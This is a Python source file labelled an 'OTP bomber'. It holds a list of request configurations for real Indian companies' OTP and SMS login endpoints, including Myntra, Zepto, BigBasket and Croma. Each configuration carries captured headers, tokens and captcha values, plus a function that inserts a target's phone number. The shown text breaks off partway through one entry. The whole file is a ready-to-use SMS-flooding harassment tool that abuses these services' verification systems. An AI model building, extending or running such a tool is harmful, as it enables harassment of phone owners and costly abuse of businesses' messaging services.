# apis.py
# 🔥 ULTIMATE OTP BOMBER - ALL APIs CONVERTED
# Format: {"name": "...", "url": "...", "method": "POST/GET", "headers": {...}, "data": lambda phone: "..."}

ULTIMATE_APIS = [
    
    # ==============================================================================
    # 🟢 GOLDEN LIST (WORKING APIs)
    # ==============================================================================
    
    {
        "name": "Allen",
        "url": "https://api.allen-live.in/api/v1/auth/sendOtp?center_id&source=home-page-login",
        "method": "POST",
        "headers": {
            'User-Agent': "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Mobile Safari/537.36",
            'Accept': "application/json",
            'Accept-Encoding': "gzip, deflate, br, zstd",
            'Content-Type': "application/json",
            'sec-ch-ua-platform': "\"Android\"",
            'x-device-id': "29eeb510-774d-47e6-9606-19142305f562",
            'sec-ch-ua': "\"Not(A:Brand\";v=\"8\", \"Chromium\";v=\"144\", \"Brave\";v=\"144\"",
            'sec-ch-ua-mobile': "?1",
            'baggage': "sentry-environment=production,sentry-release=20260123-120328,sentry-public_key=faf6a73a3042fbbe7094de5adeb3049e,sentry-trace_id=34b5e1d57c854cba9caa1203b302155f,sentry-sample_rate=0.05,sentry-sampled=false",
            'sentry-trace': "34b5e1d57c854cba9caa1203b302155f-9edfc4bdac26364c-0",
            'x-referrer': "https://allen.in/",
            'x-client-type': "mweb",
            'sec-gpc': "1",
            'accept-language': "en-US,en;q=0.9",
            'origin': "https://allen.in",
            'sec-fetch-site': "cross-site",
            'sec-fetch-mode': "cors",
            'sec-fetch-dest': "empty",
            'referer': "https://allen.in/",
            'priority': "u=1, i"
        },
        "data": lambda phone: f'{{"country_code":"91","phone_number":"{phone}","persona_type":"STUDENT","otp_type":"SHARED_DEFAULT"}}'
    },
    
    {
        "name": "Eureka Forbes",
        "url": "https://www.eurekaforbes.com/api/public/ecom/v1/otp/send",
        "method": "POST",
        "headers": {
            'User-Agent': "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Mobile Safari/537.36",
            'Accept': "application/json, text/plain, */*",
            'Accept-Encoding': "gzip, deflate, br, zstd",
            'Content-Type': "application/json",
            'sec-ch-ua-platform': "\"Android\"",
            'sec-ch-ua': "\"Not(A:Brand\";v=\"8\", \"Chromium\";v=\"144\", \"Brave\";v=\"144\"",
            'sec-ch-ua-mobile': "?1",
            'client': "web",
            'sec-gpc': "1",
            'accept-language': "en-US,en;q=0.8",
            'origin': "https://www.eurekaforbes.com",
            'sec-fetch-site': "same-origin",
            'sec-fetch-mode': "cors",
            'sec-fetch-dest': "empty",
            'referer': "https://www.eurekaforbes.com/login",
            'priority': "u=1, i"
        },
        "data": lambda phone: f'{{"mobile_number":"{phone}"}}'
    },
    
    {
        "name": "Cordelia Cruises",
        "url": "https://api-pro.cordeliacruises.com/auth/b2c/generate-otp",
        "method": "POST",
        "headers": {
            'User-Agent': "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Mobile Safari/537.36",
            'Accept-Encoding': "gzip, deflate, br, zstd",
            'Content-Type': "application/json",
            'sec-ch-ua-platform': "\"Android\"",
            'sec-ch-ua': "\"Not(A:Brand\";v=\"8\", \"Chromium\";v=\"144\", \"Brave\";v=\"144\"",
            'sec-ch-ua-mobile': "?1",
            'sec-gpc': "1",
            'accept-language': "en-US,en;q=0.5",
            'origin': "https://www.cordeliacruises.com",
            'sec-fetch-site': "same-site",
            'sec-fetch-mode': "cors",
            'sec-fetch-dest': "empty",
            'referer': "https://www.cordeliacruises.com/",
            'priority': "u=1, i"
        },
        "data": lambda phone: f'{{"phoneNumber":"{phone}","countryCode":"+91","website":"https://www.cordeliacruises.com/upcoming-cruises","pageCode":"login"}}'
    },
    
    {
        "name": "ZestMoney",
        "url": "https://authentication.zestmoney.in/v2/mobile/otp/",
        "method": "POST",
        "headers": {
            'User-Agent': "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Mobile Safari/537.36",
            'Accept': "application/json",
            'Accept-Encoding': "gzip, deflate, br, zstd",
            'Content-Type': "application/json",
            'sec-ch-ua-platform': "\"Android\"",
            'Cache-Control': "no-cache",
            'Pragma': "no-cache",
            'sec-ch-ua': "\"Not(A:Brand\";v=\"8\", \"Chromium\";v=\"144\", \"Brave\";v=\"144\"",
            'sec-ch-ua-mobile': "?1",
            'token': "135b043150475d7288b936606e086af5c1fb7f0eff15256748f5ad078ebdcf85",
            'Sec-GPC': "1",
            'Accept-Language': "en-US,en;q=0.7",
            'Origin': "https://app.zestmoney.in",
            'Sec-Fetch-Site': "same-site",
            'Sec-Fetch-Mode': "cors",
            'Sec-Fetch-Dest': "empty",
            'Referer': "https://app.zestmoney.in/"
        },
        "data": lambda phone: f'{{"MobileNumber":"91{phone}","MessageParams":{{"MerchantKey":"null"}}}}'
    },
    
    {
        "name": "Myntra",
        "url": "https://www.myntra.com/gateway/v1/auth/getotp",
        "method": "POST",
        "headers": {
            'User-Agent': "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Mobile Safari/537.36",
            'Accept-Encoding': "gzip, deflate, br, zstd",
            'Content-Type': "application/json",
            'x-meta-app': "deviceId=1719ab7b-4693-4a04-8985-61f250ee1bf5;appFamily=Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Mobile Safari/537.36;reqChannel=mweb;channel=web;",
            'sec-ch-ua-platform': "\"Android\"",
            'sec-ch-ua': "\"Not(A:Brand\";v=\"8\", \"Chromium\";v=\"144\", \"Brave\";v=\"144\"",
            'newrelic': "eyJ2IjpbMCwxXSwiZCI6eyJ0eSI6IkJyb3dzZXIiLCJhYyI6IjMwNjIwNzEiLCJhcCI6IjcxODQwOTI1MSIsImlkIjoiODI3YmE4MzRjZmFjNDg0MiIsInRyIjoiNzc2MmI4YmFjYTcxMmEwMjNhYTM1OGQwOWQzYjFmZjUiLCJ0aSI6MTc2OTQzMDE2ODI1OSwidGsiOiI2Mjk1Mjg2In19",
            'sec-ch-ua-mobile': "?1",
            'deviceid': "1719ab7b-4693-4a04-8985-61f250ee1bf5",
            'traceparent': "00-7762b8baca712a023aa358d09d3b1ff5-827ba834cfac4842-01",
            'x-myntraweb': "Yes",
            'x-location-context': "pincode=781002;source=IP",
            'x-requested-with': "browser",
            'tracestate': "6295286@nr=0-1-3062071-718409251-827ba834cfac4842----1769430168259",
            'sec-gpc': "1",
            'accept-language': "en-US,en;q=0.9",
            'origin': "https://www.myntra.com",
            'sec-fetch-site': "same-origin",
            'sec-fetch-mode': "cors",
            'sec-fetch-dest': "empty",
            'referer': "https://www.myntra.com/login",
            'priority': "u=1, i"
        },
        "data": lambda phone: f'{{"phoneNumber":"{phone}","signup":"ONECLICK"}}'
    },
    
    {
        "name": "Gokwik",
        "url": "https://gkx.gokwik.co/v3/gkstrict/auth/otp/send",
        "method": "POST",
        "headers": {
            'User-Agent': "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Mobile Safari/537.36",
            'Accept': "application/json, text/plain, */*",
            'Accept-Encoding': "gzip, deflate, br, zstd",
            'Content-Type': "application/json",
            'gk-version': "20260122163136947",
            'gk-timestamp': "58981024",
            'sec-ch-ua-platform': "\"Android\"",
            'authorization': "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJrZXkiOiJ1c2VyLWtleSIsImlhdCI6MTc2OTQzMDczNiwiZXhwIjoxNzY5NDMwNzk2fQ.uioTFtFeWVOTNOLZU5o5JFii1QQV-XI-PLRO8XtTPVM",
            'sec-ch-ua': "\"Not(A:Brand\";v=\"8\", \"Chromium\";v=\"144\", \"Brave\";v=\"144\"",
            'gk-signature': "292114",
            'gk-udf-1': "684",
            'sec-ch-ua-mobile': "?1",
            'kp-integration-type': "PLUGIN",
            'gk-request-id': "556fc4c5-9562-46fe-ae1d-7148e3299005",
            'gk-merchant-id': "19g6illukf2pz",
            'sec-gpc': "1",
            'accept-language': "en-US,en;q=0.6",
            'origin': "https://pdp.gokwik.co",
            'sec-fetch-site': "same-site",
            'sec-fetch-mode': "cors",
            'sec-fetch-dest': "empty",
            'referer': "https://pdp.gokwik.co/",
            'priority': "u=1, i"
        },
        "data": lambda phone: f'{{"phone":"{phone}","country":"IN"}}'
    },
    
    # ==============================================================================
    # 🔵 MORE WORKING APIs
    # ==============================================================================
    
    {
        "name": "Snapdeal",
        "url": "https://m.snapdeal.com/signupCompleteAjax",
        "method": "POST",
        "headers": {
            'User-Agent': "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Mobile Safari/537.36",
            'Accept-Encoding': "gzip, deflate, br, zstd",
            'pincode': "",
            'sec-ch-ua-platform': "\"Android\"",
            'sec-ch-ua': "\"Not(A:Brand\";v=\"8\", \"Chromium\";v=\"144\", \"Brave\";v=\"144\"",
            'xc': "eyJ3YXAiOnsiYWUiOiIxIiwiY2RyIjoiMSIsInBscFQiOiJiYTc1IiwicGRwZ2wiOiJiZzc1IiwiaG9tZVQiOiJiYzc1IiwiaHBkcCI6IjEiLCJodGFiIjoiMSIsIndociI6IjEiLCJqcG0iOiIxIiwiY3IiOiIxIiwibmgiOiIxIiwiY3NmIjoiMSJ9LCJtYXBpIjp7Im1xX21vZGUiOiJCIn0sInNyIjp7InNvIjoidHJ1ZSJ9LCJzYyI6eyJydG9tb2RlbCI6IkMiLCJtbCI6IjMiLCJwZGRBQiI6IkUiLCJwZGQiOiJtbDI0In0sInBzIjp7ImF0IjoicyIsIlZJIjoiSCIsIlZPIjoiQiIsIkZTIjoiQiIsImNiIjoiQyIsInNwX2luY2wiOiJ0cnVlIn19",
            'sec-ch-ua-mobile': "?1",
            'us': "",
            'u': "176943152534088536",
            'content-type': "application/json;charset=UTF-8",
            'sec-gpc': "1",
            'accept-language': "en-US,en;q=0.8",
            'origin': "https://m.snapdeal.com",
            'sec-fetch-site': "same-origin",
            'sec-fetch-mode': "cors",
            'sec-fetch-dest': "empty",
            'referer': "https://m.snapdeal.com/signin",
            'priority': "u=1, i"
        },
        "data": lambda phone: f'{{"j_password":null,"j_mobilenumber":"{phone}","agree":true,"j_confpassword":null,"journey":"mobile","numberEdit":false,"j_fullname":"Guest","swp":true}}'
    },
    
    {
        "name": "Nykaa Fashion",
        "url": "https://www.nykaafashion.com/webscripts/api/otp/generate",
        "method": "POST",
        "headers": {
            'User-Agent': "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Mobile Safari/537.36",
            'Accept-Encoding': "gzip, deflate, br, zstd",
            'Content-Type': "application/json",
            'cache-control': "max-age=0",
            'sec-ch-ua-platform': "\"Android\"",
            'x-csrf-token': "VhUNo81xmmF6kwoK",
            'sec-ch-ua': "\"Not(A:Brand\";v=\"8\", \"Chromium\";v=\"144\", \"Brave\";v=\"144\"",
            'sec-ch-ua-mobile': "?1",
            'sec-gpc': "1",
            'accept-language': "en-US,en;q=0.9",
            'origin': "https://www.nykaafashion.com",
            'sec-fetch-site': "same-origin",
            'sec-fetch-mode': "cors",
            'sec-fetch-dest': "empty",
            'referer': "https://www.nykaafashion.com/my-account",
            'priority': "u=1, i"
        },
        "data": lambda phone: f'{{"customer_mobile":"{phone}"}}'
    },
    
    {
        "name": "FabIndia",
        "url": "https://apisap.fabindia.com/occ/v2/fabindiab2c/otp/generate?lang=en&curr=INR",
        "method": "POST",
        "headers": {
            'User-Agent': "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Mobile Safari/537.36",
            'Accept': "application/json, text/plain, */*",
            'Accept-Encoding': "gzip, deflate, br, zstd",
            'Content-Type': "application/json",
            'sec-ch-ua-platform': "\"Android\"",
            'authorization': "bearer yYo1wwUV1B1yUqYeo4YrbKF5WNI",
            'sec-ch-ua': "\"Not(A:Brand\";v=\"8\", \"Chromium\";v=\"144\", \"Brave\";v=\"144\"",
            'x-anonymous-consents': "%5B%5D",
            'sec-ch-ua-mobile': "?1",
            'sec-gpc': "1",
            'accept-language': "en-US,en;q=0.6",
            'origin': "https://www.fabindia.com",
            'sec-fetch-site': "same-site",
            'sec-fetch-mode': "cors",
            'sec-fetch-dest': "empty",
            'referer': "https://www.fabindia.com/",
            'priority': "u=1, i"
        },
        "data": lambda phone: f'{{"mobileDailCode":"+91","mobileNumber":"{phone}","isLogin":false,"isSignUp":false}}'
    },
    
    {
        "name": "Shoppers Stop",
        "url": "https://api-sscom-preprod.ssecom.tech/v2/olg/sendOTP",
        "method": "POST",
        "headers": {
            'User-Agent': "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Mobile Safari/537.36",
            'Accept-Encoding': "gzip, deflate, br, zstd",
            'Content-Type': "application/json",
            'sec-ch-ua-platform': "\"Android\"",
            'authorization': "",
            'cache-control': "no-cache",
            'pragma': "no-cache",
            'sec-ch-ua': "\"Not(A:Brand\";v=\"8\", \"Chromium\";v=\"144\", \"Brave\";v=\"144\"",
            'sec-ch-ua-mobile': "?1",
            'sec-gpc': "1",
            'accept-language': "en-US,en;q=0.8",
            'origin': "https://www.shoppersstop.com",
            'sec-fetch-site': "cross-site",
            'sec-fetch-mode': "cors",
            'sec-fetch-dest': "empty",
            'referer': "https://www.shoppersstop.com/",
            'priority': "u=1, i"
        },
        "data": lambda phone: f'{{"mobile":"{phone}","type":"SIGNIN_WITH_MOBILE"}}'
    },
    
    {
        "name": "Tata Digital",
        "url": "https://api.tatadigital.com/api/v3/sso/check-phone",
        "method": "POST",
        "headers": {
            'User-Agent': "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Mobile Safari/537.36",
            'Accept': "application/json, text/plain, */*",
            'Accept-Encoding': "gzip, deflate, br, zstd",
            'Content-Type': "application/json",
            'x-request-id': "82a9506e-1004-4b7b-8d39-4c9f2cb80792",
            'sec-ch-ua-platform': "\"Android\"",
            'referring-client': "https://www.tataneu.com",
            'sec-ch-ua': "\"Not(A:Brand\";v=\"8\", \"Chromium\";v=\"144\", \"Brave\";v=\"144\"",
            'client_id': "TCP-WEB-APP",
            'request_id': "82a9506e-1004-4b7b-8d39-4c9f2cb80792",
            'sec-ch-ua-mobile': "?1",
            'client_secret': "6fe27bd7-658d-4d28-ab66-a71da9637529",
            'neu-app-version': "6.1.0",
            'anonymous_id': "33d6b700-f6e0-4467-ab04-c4421670e82b",
            'sec-gpc': "1",
            'accept-language': "en-US,en;q=0.9",
            'origin': "https://www.tataneu.com",
            'sec-fetch-site': "cross-site",
            'sec-fetch-mode': "cors",
            'sec-fetch-dest': "empty",
            'referer': "https://www.tataneu.com/",
            'priority': "u=1, i"
        },
        "data": lambda phone: f'{{"countryCode":"91","phone":"{phone}","referralCode":"","sendOtp":true}}'
    },
    
    {
        "name": "BigBasket",
        "url": "https://www.bigbasket.com/member-tdl/v3/member/otp",
        "method": "POST",
        "headers": {
            'User-Agent': "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Mobile Safari/537.36",
            'Accept': "application/json",
            'Accept-Encoding': "gzip, deflate, br, zstd",
            'Content-Type': "application/json",
            'sec-ch-ua-platform': "\"Android\"",
            'x-csrftoken': "IyBddL9vVw193tzBFuVrlZJwqMlYrTmykVle0Hr3Z9asuJDeenHwhbNrsHSy4p8W",
            'x-caller': "Monster-SVC",
            'referring-client': "https://www.bigbasket.com",
            'x-csurftoken': "lXtxjQ.MTA5Njc3NTM0NjkyOTAzMjY4Ng==.1769440108158.prw5kk96alVmHAD64X9yUfEkUZT1QpUJtbyHXgng6KY=",
            'x-tracker': "cbb828e2-b08f-45e5-81f8-f3a7a71106af",
            'sec-ch-ua': "\"Not(A:Brand\";v=\"8\", \"Chromium\";v=\"144\", \"Brave\";v=\"144\"",
            'x-timestamp': "1769440142",
            'sec-ch-ua-mobile': "?1",
            'x-entry-context': "bbnow",
            'x-entry-context-id': "10",
            'x-channel': "BB-PWA",
            'sec-gpc': "1",
            'accept-language': "en-US,en;q=0.8",
            'origin': "https://www.bigbasket.com",
            'sec-fetch-site': "same-origin",
            'sec-fetch-mode': "cors",
            'sec-fetch-dest': "empty",
            'priority': "u=1, i"
        },
        "data": lambda phone: f'{{"identifier":"{phone}","referrer":"unified_login","recaptchaToken":"0cAFcWeA7vRCKsrAghnh0FIsoKnYy-ZM_fKAFMejVF_yH4jEcbw4YMGaB5w612Ofcy6XEMFFIdK9sUpS2pEeI6xyVxVjudO4hRUnGiNjEzpLE-SMAGcHh5SomoqsCte-vdZt_pytdFYmj2yufB1f30eGrTqkgToPTNcpDkU__pwPbOn96UBELuG0W_ZMHuYEoz6CedrYxihDSsqIbKZHHtvRXi_gfdHre2r4VIiBaUiZbOxzFHsoa8hbtW6ovWi-DIEUmcf45PL6FVtV2k1PqjRKXHtPUIG8CjVyPgbmMI-pMAodW_1yZSCaFk1yxixnhy8VKu7WN89iMEFZOVQqM4xvJBCJ2BjsndX0pcCq-ofboiVBmuzd9DL-wHQTUHFF2N-NpY2QbYuTamL3yoQe-npkSiTdnHkX_fc6zD1AjzLupBAILJ4e68raOfANXP_kjs3GHeIOXGQJGbq9H1B6GSbh0Osusoz6WCPL7ReUG2a3MnmTo7D6q3cKMXVWxUV4ihURog1Ugu_-5Cg1wkLzZFsCt6hD33O1NkcacvAxq2N1SF-27lHEvzNMlFLr-Gqr_BoDf_eHfs_8oOFd4UDYzmavJTvYupl0WdAZ8B_lSqhzcjKtXSb7D6pDdYy8keb7XTa-5tr9MQdlYEmU6ZEe4OMnUaAEtItlrj8ztnvclQuGGlas1I5jfTcTj6GkNGRsrz5RUx4HB880cdQFC6r4FGgHjIfURE4Jx-oUbUw9-dY0sO9l1UArcp4Tf46F3Ddb3heJHbKGCryx4MVuEE4gLlvE1o7ewRjhmSC5yEdHkn-9Sg2wBK01j2tt9Odg2rZjALhsrCZP95sbMZiEj7--mzdgzUU4XPDzh2GP0fFcyez40_FLC1NZucnndieKdYlmZkZjyfX4B0A8Yk9J21UAnvi0oRJMoCrKiujKLm1ONCjJUpenGhSSaax3Oz3RG0LM9lNSJTORsd8g7keUhrSTuMGn4dLT4Igotp1q1dJCA4IAmZHCw3IyWW4i8HWP2mTS6UWricCh31KNA4p9kB6dbRpurLClkowbmMrxZm7gwhRX4kvuNMNADeKeXk-qm8nDJvj56a2o1voueoGCnGWO6TQiJYYYA5ut15ANub1Be1ChG34cJmVCbWOqVKkxHUJQFEJOmZ4wxn9f3GDhtEHz5GWTOl9FdnnjkViBhSP8M791BDBKeESqB6Fkn-oUL7XN0xgPlsKRt7I3Hh3sNqvWmxwdoCr2p-nmQSflQhnTCoB0dRHZm12nu5VeXfdxzI55w_4tbeYEqg5EXT3xl3nxi6MGOLcLVY4RnOe9OtRR8k9z2w8emkFb75cG-98dlnjR1KvpdI_PQk7q53SmxJ450P24_IZlbPL593wPEzUv6wMPukB3vaYrzsENCkZzfOS9IVyiBCcoNmnLuudBXv6CyNZYamQ3umJ9fyC6Vrd0Mwu3fmC85tfgOrAGY93NHdAOF3UjK7KsxdeEp1BrePzc23o4qcFJojWJKq-FE_DFoeXUoqRlxtpFpSQtkNcqcinJCJW8bZF8nlc1UzxrJvDf3dX_TXywqvCs5dr_U0JK26wsMjav_kZqy66AgBHGm2LjhaKoeFUm14HKQIzIhHBVYMNukf3t6WSE6x2NyV7JuheelsxoXXs05PBIHh26P8uxVuitRk_ScMQypNI_RjnPXNlqTRzNg6qd76ndO4nZGFqZpWk1j52XWgxC11Upr6om7dmz6oJENzZEKbUQAya1WMBF4pSdY_L4dxF10ZjXiS37N9lSZDGnWlAQEB5bGkkrxhR2L40jZPDrdlJItLkGLDvNv7NQDQHeSZGJcDfrsqrliDtLnWaZT-1gxLu0YxdN-g0QoxKyf74R4uo-eRFvNC1sAr86L5xGXekAo_5mz-H4OxT75UVJDYUfeUqPCeL6a-4XET9qi8yC-L2qAuwuyvpWA8g8rqSQnUug"}}'
    },
    
    {
        "name": "Zepto",
        "url": "https://bff-gateway.zepto.com/api/v1/user/customer/send-otp-sms/",
        "method": "POST",
        "headers": {
            'User-Agent': "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Mobile Safari/537.36",
            'Accept': "application/json",
            'Accept-Encoding': "gzip, deflate, br, zstd",
            'sec-ch-ua': "\"Not(A:Brand\";v=\"8\", \"Chromium\";v=\"144\", \"Brave\";v=\"144\"",
            'bundleversion': "v1",
            'sec-ch-ua-mobile': "?1",
            'content-type': "application/json; charset=UTF-8",
            'x-csrf-secret': "uD0aoNYI_ZA",
            'platform': "WEB",
            'sec-ch-ua-platform': "\"Android\"",
            'origin': "https://www.zepto.com",
            'referer': "https://www.zepto.com/"
        },
        "data": lambda phone: f'{{"mobileNumber":"{phone}"}}'
    },
    
    {
        "name": "Pepperfry",
        "url": "https://www.pepperfry.com/api/account/auth/sentOtp",
        "method": "POST",
        "headers": {
            'User-Agent': "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Mobile Safari/537.36",
            'Accept': "application/json, text/plain, */*",
            'Accept-Encoding': "gzip, deflate, br, zstd",
            'Content-Type': "application/json",
            'req_csrf': "fe052e2d14f8dadc23ee66baeb655aa86e14b768a8b1092f85bf82cddd0c3fc3",
            'sec-ch-ua-platform': "\"Android\"",
            'uid': "",
            'sec-ch-ua': "\"Not(A:Brand\";v=\"8\", \"Chromium\";v=\"144\", \"Brave\";v=\"144\"",
            'sec-ch-ua-mobile': "?1",
            'lms_platform': "wap_mob",
            'frontend': "",
            'mid': "",
            'source': "wap",
            'platform': "wap_mob",
            'ngsw-bypass': "",
            'sec-gpc': "1",
            'accept-language': "en-US,en;q=0.9",
            'origin': "https://www.pepperfry.com",
            'sec-fetch-site': "same-origin",
            'sec-fetch-mode': "cors",
            'sec-fetch-dest': "empty",
            'referer': "https://www.pepperfry.com/",
            'priority': "u=1, i"
        },
        "data": lambda phone: f'{{"mobile":"{phone}","mobile_country":"+91","token":"0cAFcWeA62q-7FFiAnYUmAjiVWY6iDnB-XGx5QXXkjdcfi0Dt_ffbJvh20parHQSdIiykdttMKqQlco9yy_bmJyEm3wvdPYmT8hCBy3ICpjkWIct3fReXwIciTRoU7HMphcQxbipOrdZtLK34VRx9ykFAAocmnPKklBYv3mLPV0oWpPfAQfIbcmTRqDK5e6zFjy1tssu25uFUfApdMv8iDMNTg1ZLWGLoNJsfzNbU4oVorL4b33jl3_dLEufq9aUyIqhmh2teUm1mpsXhwGU6R19wpZbG8Sg1tmQN9NtgUaM1GLzCJDkA2TUADenrvLD9rGKXM8hCepK-94PczhpUaD0Ba-ycJvELryyNFAxzyIROtMD15OeNCg1ofon7RmsrtqNEanBD4JsGxE1y4t8P4kO4wgifVCuUXVFZ-aqBYYE5AfriaB398Ll3pMI6xfBEShFcQ2VUZtRJRLMqVTlTT7Zm360sEeB2ELwGT4nvbACx41vPu3T5os-ek_tMOFOlwFF1thulhguUMK6Jt7PtjbCqX7hx6iYmylXsqHgOoOLotJ7vyXgMK076lr3qOwe3Vyo7v86QbrVK-cGo1JAy4oBcC-9JtIPk7j2HUn93GqXWfGO8DanCdw0t65AxvYcs02TafpIHIVIprLktM_TrVDSbWEn181Pg1uZzoydwCPaKOZRqEzASAGj0fRWJ7D-5NpWkV1yRpBUZRl1878Wlu4i999uTdwM5bCpFxjQfDG70MWvuCCmHe1imdPS4OgFv-GuhfWeRroPoeTMLD_8yfiy5R6yrJWzW9JtW33hhyB3yn5A14pGuB2hohMVqlJh5woaM2y7OGhyotWynnyYUpjp_ZqExYNI9f-h5Iyz8CB6mYfFfW_a8WqSMwPT34zkX3CHZhsTVQ3O-NUJPWmjBDKcjRC8jzdYvA8BZKAiXN4ugKZqtsaY-RcL6ps9CaF8xSLF0CENhlCZz2GgBo11V-auvdqJ5ziygoJU5_umG_Z6Z1u6n2BJKamrpAL2W9Sm7IpZ0CS_z8yzOP3eKnBXtjM0aQl9exIxzo524k-xDQRuIBg84-WGqgHZ6MEtXjkvIX9wAgQVcfgqmBdPcH8ygpplwIyXN9zATjX_JVwWocPUwHHzUdnVj3RooQacz0r70wYoJfRDOiVB-4pmwagT5X1wpZm_6Cp4sPAeJCmFQuSrFy0BkevPFUzkwz_Udy4QEBA3HvMS-e2SZ-SgUdvgknRFga5tVCkzw0IBXu1jF4mpUZIHUrsoWJZPhePvROi_phXkXOSS56WHf5Tp9OmBbJIgt475vMVgjAnTI08VLeSOwQmjlJJybD6WW21bQFDib8mu2K8Ig97f9t5wjnwKBII26FTgm39YN59S2TVhB37GD7VpHU4djEEJeNtipsZdk08kKFJo0hKdd6mZBZOaeJFAE0Iy5eFFBZnJY2ST8xQUqYxrjtjf6FEEyllZxNxQIgIMZHS7MFnhVT1GFYVDXMNZ2sYEJgWtsKnxa2oGdjux7L_gzhx9LGnbAHlv1PGMeyUKG368Gilcrju5vrHrGt0EH9_32f5IXOMHubTnvv460mywv_UcAVCa4p05HjInQHNq_U4ipm8uhuzDre6uKT0fwrjjtM0BlAm0aXXC1awshv0INesFrNV_HE5z8icnkFieI10lefcxYKhbTYCIIKoSw7o0zpVprRNXqX6KXBlT-Gf8k2UMPKTs6cD9DmOa91Q8pTsulANZ1_wMKGxs2C3j-A9ANYKuG31n05QqvlF92AZngNZ37g5jAOZXxN8zeir6ZNDrBMp13eI-YSC2I4XAnVBEUMAmxtEMMhxHHhJdXtl1Lf44e6lQA3nGeUqiwxn2n5GCG4DRRPH3tW_vQxYIU_b7urI_9__WsOGCz0pk4aNEdPEJiM44ykamN8gU7L6Tlf1b-Ompx7"}}'
    },
    
    {
        "name": "Croma",
        "url": "https://api.tatadigital.com/api/v2/sso/check-phone-croma",
        "method": "POST",
        "headers": {
            'User-Agent': "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Mobile Safari/537.36",
            'Accept': "application/json, text/plain, */*",
            'Accept-Encoding': "gzip, deflate, br, zstd",
            'Content-Type': "application/json",
            'sec-ch-ua-platform': "\"Android\"",
            'sec-ch-ua': "\"Not(A:Brand\";v=\"8\", \"Chromium\";v=\"144\", \"Brave\";v=\"144\"",
            'client_id': "CROMA-WEB-APP",
            'sec-ch-ua-mobile': "?1",
            'sec-gpc': "1",
            'accept-language': "en-US,en;q=0.6",
            'origin': "https://www.croma.com",
            'sec-fetch-site': "cross-site",
            'sec-fetch-mode': "cors",
            'sec-fetch-dest': "empty",
            'sec-fetch-storage-access': "none",
            'referer': "https://www.croma.com/",
            'priority': "u=1, i"
        },
        "data": lambda phone: f'{{"countryCode":"91","phone":"{phone}"}}'
    },
    
    {
        "name": "Urban Ladder",
        "url": "https://www.urbanladder.com/api/service/application/user/authentication/v1.0/login/otp",
        "method": "POST",
        "headers": {
            'User-Agent': "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Mobile Safari/537.36",
            'Accept': "application/json, text/plain, */*",
            'Accept-Encoding': "gzip, deflate, br, zstd",
            'Content-Type': "application/json",
            'sec-ch-ua-platform': "\"Android\"",
            'authorization': "Bearer NjVmNDM3ZmFlNzg4NTEwMjg3MDdkYWVlOmI0ZEZvd2ZRSw==",
            'sec-ch-ua': "\"Not(A:Brand\";v=\"8\", \"Chromium\";v=\"144\", \"Brave\";v=\"144\"",
            'sec-ch-ua-mobile': "?1",
            'x-fp-signature': "v1.1:998c6041e6f96ce4cd8cbd6e96802abcbb0b75c4c365a6392010d91d2b650721",
            'x-fp-date': "20260126T151542Z",
            'x-fp-sdk-version': "1.4.15-alpha.1753175666",
            'x-currency-code': "INR",
            'sec-gpc': "1",
            'accept-language': "en-US,en;q=0.9",
            'origin': "https://www.urbanladder.com",
            'sec-fetch-site': "same-origin",
            'sec-fetch-mode': "cors",
            'sec-fetch-dest': "empty",
            'referer': "https://www.urbanladder.com/auth/login",
            'priority': "u=1, i"
        },
        "data": lambda phone: f'{{"mobile":"{phone}","country_code":"91","captcha_code":"grimlock_eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0IjoxNzY5NDQwNTQyNjAyfQ.4sY-nJ89czQEY0MYp2hT1sRH0ADY9c1LE-AuC-hIHbY"}}'
    },
    
    {
        "name": "Aakash",
        "url": "https://antheapi.aakash.ac.in/api/generate-lead-otp",
        "method": "POST",
        "headers": {
            'User-Agent': "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Mobile Safari/537.36",
            'Accept-Encoding': "gzip, deflate, br, zstd",
            'Content-Type': "application/json",
            'cache-control': "max-age=0",
            'sec-ch-ua-platform': "\"Android\"",
            'sec-ch-ua': "\"Not(A:Brand\";v=\"8\", \"Chromium\";v=\"144\", \"Brave\";v=\"144\"",
            'x-client-id': "a6fbf1d2-27c3-46e1-b149-0380e506b763",
            'sec-ch-ua-mobile': "?1",
            'sec-gpc': "1",
            'accept-language': "en-US,en;q=0.7",
            'origin': "https://www.aakash.ac.in",
            'sec-fetch-site': "same-site",
            'sec-fetch-mode': "cors",
            'sec-fetch-dest': "empty",
            'referer': "https://www.aakash.ac.in/",
            'priority': "u=1, i"
        },
